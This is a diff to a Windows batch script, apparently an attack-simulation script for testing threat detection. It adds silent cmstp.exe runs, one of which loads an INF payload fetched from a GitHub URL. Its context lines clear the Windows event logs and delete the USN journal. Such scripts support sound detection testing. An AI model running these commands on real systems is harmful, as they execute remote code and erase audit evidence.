@@ -495,7 +495,13 @@ gpresult /H gpreport.html
 ECHO ============================
 wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:
 ECHO ============================
+cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+ECHO ============================
+cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf     
+ECHO ============================
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
+ECHO ============================
 PAUSE
